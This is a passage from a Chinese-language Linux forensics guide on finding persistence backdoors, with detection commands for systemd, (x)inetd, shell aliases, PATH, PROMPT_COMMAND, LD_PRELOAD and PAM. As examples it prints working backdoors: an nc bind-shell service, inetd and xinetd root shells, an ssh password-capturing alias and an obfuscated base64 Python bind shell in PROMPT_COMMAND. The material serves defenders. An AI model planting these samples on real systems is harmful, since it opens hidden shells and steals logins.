```shell
/etc/systemd/system/
/run/system/system/
[/usr]/lib/systemd/system/
/etc/rc.*    
```
以下给出一个例子，systemd自启动后门运行的检查过程。
```shell
# 发现开机自启动项存在名为backdoor的服务，同时网络端口上有个nc监听在41111口上。
systemctl list-unit-files --type service |grep enabled
netstat -ntaup
# 查看该service文件发现以下内容，这是一段bindshell指令。
cat /usr/lib/systemd/system/backdoor.service
[Unit]
Description=Just a simple backdoor for test
After=network.target
[Service]
Type=forking
ExecStart=bash -c "nc -l -p 41111 -e /bin/bash &"
ExecReload=
ExecStop=
PrivateTmp=true
[Install]
WantedBy=multi-user.target
```
#### 1.3.2 (x)inetd后门
inetd是早期的超级任务管理程序，后来被xinetd代替。目前不少系统默认没有安装并开启xinetd。但请注意，系统内开启了telnet则一定要检查(x)inetd。
一个典型的inetd后门形如：
```shell
#这是一个bindshell后门
#inetd进程监听着某端口
netstat -ntaup|grep inetd
cat /etc/inetd.conf #发现存在daytime stream tcp nowait /bin/sh sh –I
cat /etc/services |grep daytime #发现daytime服务绑定在(13/*)
```
一个典型的xinetd后门形如：
```shell
#这是一个bindshell后门
cat /etc/xinet.d/safe-guard.xinetd
# default: yes
# description: The safe-guard server servestelnet sessions;
service safe-guard
{
  flags = REUSE
  socket_type = stream
  wait = no
  user = root
  server =/bin/bash
  log_on_failure += USERID
  disable = no
}
cat /etc/services |grep safe-guard
safe-guard      58888/tcp               # CentOS safe-guard master daemon
```
可以在排查时关注脚本文件内是否含有以下字符串：
```shell
/bin/bash
/bin/sh
/usr/sbin/in.telnetd
/usr/sbin/in.rshd
/usr/sbin/in.rlogind
/usr/sbin/in.rexecd
```
### 1.4 篡改shell及公共配置文件
#### 1.4.1 别名后门
命令别名后门通过在shell配置文件及公共配置文件中定义alias/hash等命令诱导用户使用被篡改的命令。排查方式比较简单，检查文档中是否出现此类关键字就行。一般来说，默认的alias即使有命令也普遍集中于ls/grep。
```shell
a=(/etc/profile /etc/bashrc ~/.bashrc ~/.bash_file ~/.profile)
for i in `echo $a`;do grep "alias\|hash" $i; done
```
常见的别名后门，如：
```shell
# 在/etc/profile内alias+strace+ssh偷密码：
alias ssh='strace -o /tmp/sshwd-`date '+%d%h%m%s'`.log -e read -s 2048 ssh'
# 在/etc/profile内添加了如下命令：
alias ls="alerts(){ ls $* --color=auto;ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=32110 };alerts"
# 在~/.bashrc中添加如下命令：
alias sudo='/tmp/.sudo'
```
不常见的，如：
利用hash命令，劫持常用命令。hash 用于查看terminal创建后某项命令程序的使用次数。hash -p参数可以用来设置某个二进制程序的运行别名，如果在/etc/profile内预先执行能达到类似于alias后门的效果。
```shell
hash -p /tmp/su-backdoor su 
hash -p /tmp/sudo-backdoor sudo
```
#### 1.4.2 篡改环境变量
程序的运行普遍依赖一定的环境变量，篡改环境变量可以改变程序的资源分配甚至改变使用者本想运行的命令。攻击者通过在shell配置文件及公共配置文件中设置环境变量的值达到影响程序的目的。
##### $PATH后门
攻击类型1：篡改$PATH
攻击者修改$PATH，手工加入更高优先级的目录，并放入同名后门程序，用来劫持常用的命令。排查命令：
```shell
grep -n "PATH=\|:\$PATH" ~/.* 2>/dev/null
grep -rn "PATH=\|:\$PATH" /etc/profi* 2>/dev/null
grep -n "PATH=\|:\$PATH" /etc/bashrc 2>/dev/null
```
检查结果中是否存在非常见的目录如：家目录、/tmp目录。
攻击类型2：利用$PATH的缺陷。
攻击者在现有的高优先级的目录中放置同名后门程序，劫持低目录中的程序。排查命令：
```shell
# 例如攻击者通过在/usr/local/sbin或/usr/local/bin中部署后门程序如sudo，可以优先于原本/usr/bin/sudo执行。
find /usr/local/sbin -perm -100 -type f> 1.txt
find /usr/local/bin -perm -100 -type f >>1.txt
find /home -perm -100 -type f >>1.txt
find /root -perm -100 -type f >>1.txt
cat 1.txt|sort|uniq -c|sort -nr|head -n 10
```
##### $PROMPT_COMMAND后门
该环境变量通俗来说用于在执行每条命令前执行命令，不少运维人员利用它来做历史记录加固，但是攻击者同样可以利用它来插入后门逻辑。排查命令如下：
```shell
grep -n "PROMPT_COMMAND" ~/.* 2>/dev/null
grep -rn "PROMPT_COMMAND" /etc/profi* 2>/dev/null
grep -n "PROMPT_COMMAND" /etc/bashrc 2>/dev/null
```
正常的该环境变量内容应该是关于shell的界面显示：
```shell
#    PROMPT_COMMAND='echo -ne "\033]0;${USER}@${HOSTNAME}: ${PWD}\007"'
```
或是结合历史记录加固的：
```shell
history -a; history -a; printf "\033]0;%s@%s:%s\007" "${USER}" "${HOSTNAME%%.*}" "${PWD/#$HOME/~}"
```
而下面这种情况是一条利用环境变量来做bind shell的后门。每一次执行先检查端口有没有占用，如果没占用，立马开一个后门端口。
```shell
export PROMPT_COMMAND="lsof -i:23333 &>/dev/null || (python2 -c \"exec('aW1wb3J0IHNvY2tldCxvcyxzeXMKcz1zb2NrZXQuc29ja2V0KCkKcy5iaW5kKCgiIiwyMzMzMykpCnMubGlzdGVuKDEpCihjLGEpPXMuYWNjZXB0KCkKd2hpbGUgMToKIGQ9Yy5yZWN2KDUxMikKIGlmICdleGl0JyBpbiBkOgogIHMuY2xvc2UoKQogIHN5cy5leGl0KDApCiByPW9zLnBvcGVuKGQpLnJlYWQoKQogYy5zZW5kKHIpCg=='.decode('base64'))\" 2>/dev/null &)"
```
##### $LD_PRELOAD后门
$LD_PRELOAD用于指定程序动态库的加载。动态库的加载满足下面的定义顺序：
```shell
$LD_PRELOAD>$LD_LIBRARY_PATH>/etc/ld.so.cache>/lib>/usr/lib
```
故而，攻击者利用该环境变量定义的库文件可以实现对函数的劫持。
排查命令如下：
```shell
grep -n "LD_PRELOAD" ~/.* 2>/dev/null
grep -rn "LD_PRELOAD" /etc/profi* 2>/dev/null
grep -n "LD_PRELOAD" /etc/bashrc 2>/dev/null
#观察结果内是否存在形如：export LD_PRELOAD=/xxxx/xxx.so
```
如果系统内正在运行的进程存在加载了该环境变量的可能，通过检查/proc/*/environ也能快速定位到受影响的进程。
```shell
cat /proc/*/environ |tr '\0' '\n'|grep LD_PRELOAD
grep -rn LD_PRELOAD /proc/*/environ
```
##### $LD_LIBRARY_PATH后门
与$LD_PRELOAD后门检测方法基本一致：
```shell
grep -n "LD_LIBRARY_PATH" ~/.* 2>/dev/null
grep -rn "LD_LIBRARY_PATH" /etc/profi* 2>/dev/null
grep -n "LD_LIBRARY_PATH" /etc/bashrc 2>/dev/null
# 观察结果内是否存在形如：export LD_LIBRARY_PATH =/xxxx/xxx.so
```
### 1.5 篡改库文件
#### 1.5.1 pam后门
“Linux-PAM（即linux可插入认证模块）是一套共享库,使本地系统管理员可以随意选择程序的认证方式。换句话说，不用(重新编写)重新编译一个包含PAM功能的应用程序，就可以改变它使用的认证机制，这种方式下，就算升级本地认证机制,也不用修改程序。”换个角度来看，如果攻击者可以通过篡改pam模块达到劫持认证的目的。
PAM配置应用认证方式的文件在/etc/pam.d/目录下。调用的模块库:
```shell
RHEL:/usr/lib64/security/
Debian: /usr/lib/x86_64-linux-gnu/security/
```
主要的利用方式有两种：
（1）	篡改配置文件，加入攻击者自定义的pam库文件。
sshLooterC就是这样一个工具。 https://github.com/mthbernardes/sshLooterC 
试了下RHEL上可以运行，Debian上有些问题，通过在/etc/pam.d/common-auth中插入编译好的so文件，并将编译好的劫持库放到目录下即可。
取证的方法就是检查配置文件有没有被篡改。如果系统支持包管理检查的话，可以确认以下有没有配置文件被改了。
```shell